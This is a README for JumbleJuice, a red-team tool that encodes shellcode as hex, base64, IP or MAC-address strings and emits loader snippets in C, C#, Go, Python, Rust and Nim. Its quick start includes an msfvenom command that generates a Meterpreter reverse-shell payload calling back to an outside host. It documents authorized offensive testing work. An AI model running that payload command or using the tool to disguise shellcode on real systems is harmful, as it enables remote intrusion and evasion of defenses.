# JumbleJuice

Binary payload encoder for red team operations. Feed it shellcode, pick an encoding scheme and a target language, and get back a ready-to-paste code snippet with the encoded data, a decoder function, and the required imports.

**6 encoders** (hex, base64, decimal, IPv4, IPv6, MAC) x **6 languages** (C, C#, Go, Python, Rust, Nim) = 36 combinations out of the box.

Zero external dependencies. Single static binary.

## Warning

This tool generates code that decodes and executes arbitrary payloads. Use it only on systems you own or have explicit written authorization to test.

## Install

```bash
go build -o jj cmd/jj/main.go
```

Requires Go 1.22+. Or grab a prebuilt binary from the [releases](https://github.com/M3aCulpa/JumbleJuice/releases) page.

## Quick start

```bash
# generate a C snippet with IPv4-encoded shellcode
jj -i shellcode.bin -e ipv4 -t c

# pipe from msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f raw | jj -i - -e mac -t csharp

# just the data array, no decoder
jj -i payload.bin -e hex -t rust --raw

# save to file
jj -i shellcode.bin -e b64 -t python -o loader.py
```

## Usage

```
jj -i <input> [-e encoder] [-t language] [-o file] [--raw]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-i` | (required) | Input file (use `-` for stdin) |
| `-e` | `ipv4` | Encoding scheme |
| `-t` | `c` | Target language |
| `-o` | stdout | Write to file instead of stdout |
| `--raw` | | Data blob only, no decoder or imports |

## Encoders

| Name | Bytes per unit | Example output |
|------|---------------|----------------|
| `hex` | 1 | `0x48, 0x65, 0x6C, ...` |
| `b64` | 3 -> 4 chars | Standard base64 |
| `dec` | 1 | `72, 101, 108, ...` |
| `ipv4` | 4 | `72.101.108.108` |
| `ipv6` | 16 | `0048:0065:006c:006c:006f:0000:0000:0000` |
| `mac` | 6 | `48:65:6C:6C:6F:21` |

Encoders that group multiple bytes (ipv4, ipv6, mac) zero-pad the last chunk. The emitted `data_original_size` constant tells the decoder where to truncate.

## Output format

Every snippet has three labeled sections you can copy independently:

```c
// === imports ===
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// === data ===
static const char* data[] = {
    "72.101.108.108",
    "111.0.0.0"
};
static const size_t data_count = 2;
static const size_t data_original_size = 5;

// === decoder ===
size_t decode(unsigned char* dst, size_t dst_len) {
    ...
}
```

Section markers use the target language's comment syntax (`//` for C/C#/Go/Rust, `#` for Python/Nim).

Use `--raw` to get only the data section if you're writing your own decoder.

## Project layout

```
cmd/jj/              CLI entry point
internal/encoder/    Encoding schemes (hex, b64, dec, ipv4, ipv6, mac)
internal/emitter/    Code generators (c, csharp, go, python, rust, nim)
internal/common/     File I/O, hashing
```

Both encoders and emitters use a registry pattern. Adding a new encoder or language is one file with an `init()` call. The CLI auto-discovers registered names.

## Development

```bash
make setup    # install linters
make test     # run all tests with race detection
make build    # build the binary
make lint     # golangci-lint + staticcheck
make coverage # generate coverage report
```

## Tests

```bash
go test -race ./...
```

Round-trip tests verify every encoder produces output that decodes back to the original input. Emitter tests confirm all 36 encoder/language combinations produce valid, non-empty snippets with correct section markers.

## License

MIT. See [LICENSE](LICENSE).
